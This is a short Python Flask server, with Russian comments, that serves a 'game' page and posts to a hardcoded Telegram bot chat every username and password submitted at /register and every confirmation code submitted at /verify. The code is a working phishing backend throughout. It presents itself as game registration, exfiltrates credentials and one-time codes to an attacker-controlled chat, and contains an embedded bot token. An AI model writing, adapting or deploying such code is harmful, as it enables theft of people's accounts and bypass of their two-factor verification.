import os
from flask import Flask, request, send_from_directory
import requests

app = Flask(__name__)

# Вставьте ваш токен и ID
BOT_TOKEN = '9038835625:AAFu10GqwkIBpYoKaTpVOB_qb5zwWPeypD4'
CHAT_ID = '8642764105'


# Страница игры (открывается по умолчанию)
@app.route('/')
def index():
    return send_from_directory('.', 'game.html')


# Прием логина и пароля
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    text = f"🎮 **Новая регистрация в игре**\n\n👤 Логин: `{username}`\n🔑 Пароль: `{password}`"

    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}
    requests.post(url, json=payload)

    return 'OK', 200


# Прием кода подтверждения
@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    code = data.get('code')

    text = f"🔢 **Код подтверждения (Игра)**\n\nКод: `{code}`"

    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}
    requests.post(url, json=payload)

    return 'OK', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)